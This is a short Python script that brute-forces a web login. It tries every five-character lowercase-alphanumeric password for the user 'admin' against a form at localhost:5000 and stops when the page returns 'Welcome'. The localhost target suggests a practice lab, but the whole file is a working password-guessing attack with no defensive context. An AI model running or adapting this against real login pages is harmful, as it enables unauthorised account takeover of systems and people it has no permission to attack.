import itertools

def brute_force(username):
	chars="abcdefghijklmnopqrstuvwxyz0123456789"
	for attempt in itertools.product(chars , repeat=5):
		attempt="".join(attempt).strip()
		print("trying",attempt,"for",username)

		import requests 
		response=requests.post("http://localhost:5000/inject",data={"username":username,"password":attempt})
		
		if(response.text.find("Welcome") != -1):
			print("found",attempt,"for",username )
			return attempt	
	return None 

print(brute_force('admin'))
